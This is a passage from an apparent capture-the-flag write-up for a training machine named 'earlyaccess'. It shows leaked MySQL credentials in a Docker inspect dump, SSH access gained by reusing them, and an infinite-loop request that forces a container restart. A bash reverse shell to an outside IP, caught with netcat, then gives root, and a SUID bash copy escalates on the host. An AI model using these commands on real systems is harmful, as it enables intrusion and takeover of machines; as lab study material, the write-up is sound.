--silent"],"Timeout":2000000000},"Hostname":"mysql","Image":"mysql:latest","Labels":{"com.docker.compose.config-hash":"947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"app","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/app","com.docker.compose.service":"mysql","com.docker.compose.version":"1.29.1"},"OnBuild":null,"OpenStdin":false,"StdinOnce":false,"Tty":true,"User":"","Volumes":{"/docker-entrypoint-initdb.d":{},"/var/lib/mysql":{}},"WorkingDir":""},"Created":"2022-02-17T14:54:15.777399714Z","Driver":"overlay2","ExecIDs":null,"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/059484f442c66cea138b9134c7ea4922695096011cc9783d1ab01699766e25db-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff","MergedDir":"/var/lib/docker/overlay2/059484f442c66cea138b9134c7ea4922695096011cc9783d1ab01699766e25db/merged","UpperDir":"/var/lib/docker/overlay2/059484f442c66cea138b9134c7ea4922695096011cc9783d1ab01699766e25db/diff","WorkDir":"/var/lib/docker/overlay2/059484f442c66cea138b9134c7ea4922695096011cc9783d1ab01699766e25db/work"},"Name":"overlay2"},"HostConfig":{"AutoRemove":false,"Binds":["/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro","app_vol_mysql:/var/lib/mysql:rw"],"BlkioDeviceReadBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceWriteIOps":null,"BlkioWeight":0,"BlkioWeightDevice":null,"CapAdd":["SYS_NICE"],"CapDrop":null,"Cgroup":"","CgroupParent":"","CgroupnsMode":"host","ConsoleSize":[0,0],"ContainerIDFile":"","CpuCount":0,"CpuPercent":0,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpuShares":0,"CpusetCpus":"","CpusetMems":"","DeviceCgroupRules":null,"DeviceRequests":null,"Devices":null,"Dns":null,"DnsOptions":null,"DnsSearch":null,"ExtraHosts":null,"GroupAdd":null,"IOMaximumBandwidth":0,"IOMaximumIOps":0,"IpcMode":"private","Isolation":"","KernelMemory":0,"KernelMemoryTCP":0,"Links":null,"LogConfig":{"Config":{},"Type":"json-file"},"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"Memory":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"NanoCpus":0,"NetworkMode":"app_nw","OomKillDisable":false,"OomScoreAdj":0,"PidMode":"","PidsLimit":null,"PortBindings":{},"Privileged":false,"PublishAllPorts":false,"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"],"ReadonlyRootfs":false,"RestartPolicy":{"MaximumRetryCount":0,"Name":"always"},"Runtime":"runc","SecurityOpt":null,"ShmSize":67108864,"UTSMode":"","Ulimits":null,"UsernsMode":"","VolumeDriver":"","VolumesFrom":[]},"HostnamePath":"/var/lib/docker/containers/73dcc3f09d02e3c72684d00720d127b3ec5a258e3b1e394fc83bfca48010ded0/hostname","HostsPath":"/var/lib/docker/containers/73dcc3f09d02e3c72684d00720d127b3ec5a258e3b1e394fc83bfca48010ded0/hosts","Id":"73dcc3f09d02e3c72684d00720d127b3ec5a258e3b1e394fc83bfca48010ded0","Image":"sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287","LogPath":"/var/lib/docker/containers/73dcc3f09d02e3c72684d00720d127b3ec5a258e3b1e394fc83bfca48010ded0/73dcc3f09d02e3c72684d00720d127b3ec5a258e3b1e394fc83bfca48010ded0-json.log","MountLabel":"","Mounts":[{"Destination":"/docker-entrypoint-initdb.d","Mode":"ro","Propagation":"rprivate","RW":false,"Source":"/root/app/scripts/init.d","Type":"bind"},{"Destination":"/var/lib/mysql","Driver":"local","Mode":"rw","Name":"app_vol_mysql","Propagation":"","RW":true,"Source":"/var/lib/docker/volumes/app_vol_mysql/_data","Type":"volume"}],"Name":"/mysql","NetworkSettings":{"Bridge":"","EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"HairpinMode":false,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"MacAddress":"","Networks":{"app_nw":{"Aliases":["mysql","73dcc3f09d02"],"DriverOpts":null,"EndpointID":"3488b6f0b46610eb4343c6c1eccf36c0ca931399608284cf732560ce6ced1718","Gateway":"172.18.0.1","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAMConfig":{"IPv4Address":"172.18.0.100"},"IPAddress":"172.18.0.100","IPPrefixLen":16,"IPv6Gateway":"","Links":null,"MacAddress":"02:42:ac:12:00:64","NetworkID":"5172d955f3b9f093b29ed421a64a7bd28d23d025434894c028510070d31ed950"}},"Ports":{"3306/tcp":null,"33060/tcp":null},"SandboxID":"85311ea4718ac2a9d89b1928bd95842f431e5a35ad6843d6b78f59a073e4f9bc","SandboxKey":"/var/run/docker/netns/85311ea4718a","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null},"Path":"docker-entrypoint.sh","Platform":"linux","ProcessLabel":"","ResolvConfPath":"/var/lib/docker/containers/73dcc3f09d02e3c72684d00720d127b3ec5a258e3b1e394fc83bfca48010ded0/resolv.conf","RestartCount":0,"State":{"Dead":false,"Error":"","ExitCode":0,"FinishedAt":"0001-01-01T00:00:00Z","Health":{"FailingStreak":0,"Log":[{"End":"2022-02-17T16:28:59.156853921+01:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2022-02-17T16:28:59.061738905+01:00"},{"End":"2022-02-17T16:29:04.275370696+01:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2022-02-17T16:29:04.159667456+01:00"},{"End":"2022-02-17T16:29:09.389113142+01:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2022-02-17T16:29:09.280519632+01:00"},{"End":"2022-02-17T16:29:14.516286641+01:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2022-02-17T16:29:14.392339402+01:00"},{"End":"2022-02-17T16:29:19.621478997+01:00","ExitCode":0,"Output":"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n","Start":"2022-02-17T16:29:19.520196511+01:00"}],"Status":"healthy"},"OOMKilled":false,"Paused":false,"Pid":1110,"Restarting":false,"Running":true,"StartedAt":"2022-02-17T14:54:17.482770653Z","Status":"running"}},"status":200}
```

The data contains credentials in the container's environment variables: the MySQL username `drew` and passwords `drew` and `XeoNu86JTznxMCQuGHrGutF3Csq5`.

```json
...
  "Env": [
	"MYSQL_DATABASE=db",
	"MYSQL_USER=drew",
	"MYSQL_PASSWORD=drew",
	"MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
	"SERVICE_TAGS=dev",
	"SERVICE_NAME=mysql",
	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
	"GOSU_VERSION=1.12",
	"MYSQL_MAJOR=8.0",
	"MYSQL_VERSION=8.0.25-1debian10"
  ],
...
```

Attempting the credential `drew`:`XeoNu86JTznxMCQuGHrGutF3Csq5` yields SSH access to `earlyaccess`. Grab the user flag from `/home/drew/user.txt`.

```bash
$ ssh drew@earlyaccess.htb
drew@earlyaccess.htb's password:
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.6
drew@earlyaccess:~$ id
uid=1000(drew) gid=1000(drew) groups=1000(drew)
drew@earlyaccess:~$ ls -la /home/drew/user.txt
-r-------- 1 drew drew 33 Feb 17 15:55 /home/drew/user.txt
```

---

## `earlyaccess`

> Privilege escalation enumeration as `drew`

`drew` has mail at `/var/mail/drew`. It is from `game-adm@earlyaccess.htb` and indicates that if the "game-server" crashes, it will automatically restart. What "game-server?"

```bash
drew@earlyaccess:~$ cat /var/mail/drew
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021


Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...)
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).
```

`drew` can write to `/opt/docker-entrypoint.d/`. According to [this StackOverflow post](https://stackoverflow.com/questions/40608055/running-a-bash-script-before-startup-in-an-nginx-docker-container), when an `nginx` Docker container is started, it executes every `bash` script in `/docker-entrypoint.d/`. `/opt/docker-entrypoint.d/` only contains `node-server.sh`, which enables SSH and starts up an Express web server from code at `/usr/src/app`. However, neither Express nor this source code are on the system. As the parent folder suggests, this is the entry point of another Docker container, presumably the "game-server" one. According to the mail from `game-adm`, it seems that if a malicious script is written to `/opt/docker-entrypoint.d/` and the "game-server" crashes, the container will restart and execute the malicious script as `root`.

There is an SSH public key for `game-tester@game-server` at `/home/drew/.ssh/id_rsa.pub`.

Checking IP addresses via `ip neigh`, it appears `game-server` is at `172.19.0.3`.

Use the SSH public key to access `game-server` as `game-tester`.

```bash
drew@earlyaccess:~$ ip neigh
172.18.0.2 dev br-5172d955f3b9 lladdr 02:42:ac:12:00:02 STALE
172.19.0.3 dev br-c4e26ce76ace lladdr 02:42:ac:13:00:03 STALE
172.18.0.102 dev br-5172d955f3b9 lladdr 02:42:ac:12:00:66 REACHABLE
10.129.0.1 dev ens160 lladdr 00:50:56:b9:2b:b5 REACHABLE
drew@earlyaccess:~$ ssh game-tester@172.19.0.3
The authenticity of host '172.19.0.3 (172.19.0.3)' can't be established.
ECDSA key fingerprint is SHA256:QGqB7McazHmqza1M22cUpTR7oLwbktNXZZOJFO5ygQA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.3' (ECDSA) to the list of known hosts.
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
game-tester@game-server:~$ id
uid=1001(game-tester) gid=1001(game-tester) groups=1001(game-tester)
```

---

## `game-server`

> Privilege Escalation to `root`

On `game-server`, TCP port 9999 is listening.

```bash
game-tester@game-server:~$ ss -l
Netid  State      Recv-Q Send-Q                            Local Address:Port                                             Peer Address:Port
nl     UNCONN     0      0                                          rtnl:591                                                          *
nl     UNCONN     0      0                                          rtnl:kernel                                                       *
nl     UNCONN     768    0                                       tcpdiag:kernel                                                       *
nl     UNCONN     4352   0                                       tcpdiag:ss/10354                                                     *
nl     UNCONN     0      0                                          xfrm:kernel                                                       *
nl     UNCONN     0      0                                         audit:sudo/55                                                      *
nl     UNCONN     0      0                                         audit:kernel                                                       *
nl     UNCONN     0      0                                     fiblookup:kernel                                                       *
nl     UNCONN     0      0                                           nft:kernel                                                       *
nl     UNCONN     0      0                                        uevent:kernel                                                       *
nl     UNCONN     0      0                                          genl:kernel                                                       *
udp    UNCONN     0      0                                    127.0.0.11:35878                                                       *:*
tcp    LISTEN     0      128                                           *:9999                                                        *:*
tcp    LISTEN     0      128                                  127.0.0.11:38771                                                       *:*
tcp    LISTEN     0      128                                           *:ssh                                                         *:*
tcp    LISTEN     0      128                                          :::ssh                                                        :::*
```

This seems to be the game server application.

```bash
game-tester@game-server:~$ curl http://localhost:9999
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Rock v0.0.1</title>
    </head>
    <body>
        <div class="container">
            <div class="panel panel-default">
                <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
                    <div class="panel-body">
                        <div class="card header">
                            <div class="card-header">
                                Test-environment for Game-dev
                            </div>
                            <div>
                                <h2>Choose option</h2>
                                <div>
                                    <a href="/autoplay"><img src="x" alt="autoplay"</a>
                                    <a href="/rock"><img src="x" alt="rock"></a>
                                    <a href="/paper"><img src="x" alt="paper"></a>
                                    <a href="/scissors"><img src="x" alt="scissors"></a>
                                </div>
                                <h3>Result of last game:</h3>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
```

Its source code can be found at `/usr/src/app/`.

```bash
game-tester@game-server:~$ ls -la /usr/src/app/
total 48
drwxrwxr-x  5 root root  4096 Aug 18  2021 .
drwxr-xr-x  1 root root  4096 Aug 19 14:15 ..
drwxrwxr-x  2 root root  4096 Aug 18  2021 assets
drwxrwxr-x 68 root root  4096 Aug 18  2021 node_modules
-rw-rw-r--  1 root root 18659 Aug 18  2021 package-lock.json
-rw-rw-r--  1 root root   315 Aug 18  2021 package.json
-rw-rw-r--  1 root root  2771 Aug 18  2021 server.js
drwxrwxr-x  2 root root  4096 Aug 18  2021 views
```

The application's `POST` `/autoplay` endpoint appears vulnerable to an infinite looping condition. The `while` loop continues running if `rounds != 0`, and `rounds` is decremented by one in every iteration. Thus, if the user inputs a negative number of `rounds`, the `while` loop will  never reach 0 and continue going on forever.

```javascript
app.post('/autoplay', async function autoplay(req,res) {

  // Stop execution if not number
  if (isNaN(req.body.rounds))
  {
    res.sendStatus(500);
    return;
  }
  // Stop execution if too many rounds are specified (performance issues may occur otherwise)
  if (req.body.rounds > 100)
  {
    res.sendStatus(500);
    return;
  }

  rounds = req.body.rounds;

  res.write('<html><body>')
  res.write('<h1>Starting autoplay with ' + rounds + ' rounds</h1>');

  var counter = 0;
  var rounds_ = rounds;
  var wins = 0;
  var losses = 0;
  var ties = 0;

  while(rounds != 0)
  {
    counter++;
    var result = play();
    if(req.body.verbose)
    {
      res.write('<p><h3>Playing round: ' + counter + '</h3>\n');
      res.write('Outcome of round: ' + result + '</p>\n');
    }
    if (result == "win")
      wins++;
    else if(result == "loss")
      losses++;
    else
      ties++;

    // Decrease round
    rounds = rounds - 1;
  }
  rounds = rounds_;

  res.write('<h4>Stats:</h4>')
  res.write('<p>Wins: ' + wins + '</p>')
  res.write('<p>Losses: ' + losses + '</p>')
  res.write('<p>Ties: ' + ties + '</p>')
  res.write('<a href="/autoplay">Go back</a></body></html>')
  res.end()
});
```

This is the condition that can be used to cause the container to become unresponsive, causing it to be restarted. This restart will trigger the malicious script in `/opt/docker-entrypoint.d/` to execute as `root` on `game-server`.

Start a reverse shell listener.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
```

Some mechanism continually deletes everything except for `node-server.sh` from `/opt/docker-entrypoint.d/`. Continually create a `bash` script with the malicious payload in the same directory.

```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ while true; do echo 'bash -i >& /dev/tcp/10.10.14.109/9000 0>&1' > blah.sh; chmod +x blah.sh; done
```

Initiate the `game-server` infinite loop:

```bash
game-tester@game-server:~$ curl -X POST http://localhost:9999/autoplay -d "rounds=-1"
```

Wait a bit and once `game-server` is restarted, receive the reverse shell as `root` on `game-server`.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.159.56] 48878
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@game-server:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## `earlyaccess`

> Privilege Escalation to `root`

`/opt/docker-entrypoint.d/` on `earlyaccess` is mounted to `/docker-entrypoint.d` on `game-server`. As `drew` on `earlyaccess`, copy `/bin/bash` to `/opt/docker-entrypoint.d/`. Then, as `root` on `game-server`, change `/docker-entrypoint.d/bash`'s owner to `root` and set its SUID bit.

```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ cp /bin/bash .
```

```bash
root@game-server:/docker-entrypoint.d# chown root bash
root@game-server:/docker-entrypoint.d# chmod +s bash
```

On `earlyaccess`, note that `/opt/docker-entrypoint.d/bash` is owned by `root` and has its SUID bit set. Execute this to elevate privileges. Read the `root` flag at `/root/root.txt`.

```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ ls -la
total 1160
drwxrwxr-t 2 root drew    4096 Feb 17 19:59 .
drwxr-xr-x 4 root root    4096 Jul 14  2021 ..
-rwsr-sr-x 1 root drew 1168776 Feb 17 19:59 bash
-rwxr-xr-x 1 drew drew      43 Feb 17 19:59 blah.sh
-rwxr-xr-x 1 root root     100 Feb 17 19:59 node-server.sh
drew@earlyaccess:/opt/docker-entrypoint.d$ ./bash -p
bash-5.0# id
uid=1000(drew) gid=1000(drew) euid=0(root) groups=1000(drew)
bash-5.0#
```

---

## Post `root` Questions

### How is `game-server` restarted when it becomes unresponsive?

In `earlyaccess`'s `/root/app/docker-compose.yml`, [willfarrell's autoheal](https://github.com/willfarrell/docker-autoheal) container is deployed. It is passed the Docker Unix socket at `/var/run/docker.sock`.

```yml
  # Auto-restarts unhealthy containers
  autoheal:
    image: willfarrell/autoheal:latest
    tty: true
    container_name: autoheal
    restart: always
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

In `game-server`'s configuration within `/root/app/docker-compose.yml`, the label `autoheal=true` is applied to ensure the `autoheal` container monitors it. The `healthcheck` option specifies exactly *how* the `autoheal` container determines whether `game-server` needs to be healed: it uses `curl` to send an HTTP `GET` request to the game server application on port 9999. If that command returns an error, it exits with code 1. If it exits with code 1, this is presumably sent along the Docker Unix socket where it is intercepted by the `healthcheck` container who then restarts the `game-server` container.

```yml
  game-server:
    build:
      context: .
      dockerfile: game-server/Dockerfile
    image: game-server
    container_name: game-server
    hostname: game-server
    volumes:
      - ./game-server/web:/usr/src/app
      - /opt/docker-entrypoint.d/:/docker-entrypoint.d
    healthcheck:
      test:
        [
          "CMD-SHELL",
          "curl --silent --fail localhost:9999 || exit 1"
        ]
      interval: 10s
      timeout: 5s
      retries: 1
      start_period: 30s
    labels:
    - "autoheal=true"
```

### What mechanism continually deletes all files except for `node-server.sh` in `earlyaccess`'s `/opt/docker-entrypoint.d/`?

`root` has a cron job configured to remove all files and directories from `/opt/docker-entrypoint.d/`, copy `/root/app/game-server/node-server.sh` into `/opt/docker-entrypoint.d/`, and set it to be executable every minute.

```bash
root@earlyaccess:~/app# crontab -l
* * * * * bash -c 'rm -rf /opt/docker-entrypoint.d/*; cp /root/app/game-server/node-server.sh /opt/docker-entrypoint.d/; chmod +x /opt/docker-entrypoint.d/node-server.sh'
```
